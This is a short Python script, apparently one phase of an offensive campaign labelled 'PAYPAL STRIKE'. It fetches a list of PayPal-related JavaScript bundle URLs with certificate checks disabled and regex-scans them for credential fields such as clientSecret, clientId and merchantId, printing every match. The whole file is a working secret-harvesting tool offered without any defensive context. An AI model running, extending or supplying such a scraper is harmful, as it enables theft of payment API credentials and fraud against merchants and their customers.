import asyncio
import httpx
import re
import os

KEYWORDS = ["merchantId", "clientId", "clientSecret", "partnerId", "payerId"]

async def extract():
    print("💀 AURA RAW EXTRACT: PAYPAL STRIKE (PHASE 9)")
    if not os.path.exists("paypal_bundles.txt"):
        print("Error: paypal_bundles.txt missing.")
        return

    with open("paypal_bundles.txt", "r") as f:
        urls = [line.strip() for line in f if line.strip()]

    async with httpx.AsyncClient(verify=False) as client:
        for url in urls:
            try:
                resp = await client.get(url, timeout=20)
                if resp.status_code != 200: continue
                content = resp.text
                
                for kw in KEYWORDS:
                    # Find instances of keyword followed by value
                    matches = re.findall(rf'[\"\']{kw}[\"\'][\s:=]+["\']([\w\-\.]{10,})["\']', content, re.IGNORECASE)
                    if matches:
                        print(f"[+] FOUND in {url.split('/')[-1]}: {kw} -> {list(set(matches))}")
            except Exception as e:
                print(f"Error extracting {url}: {e}")

if __name__ == "__main__":
    asyncio.run(extract())
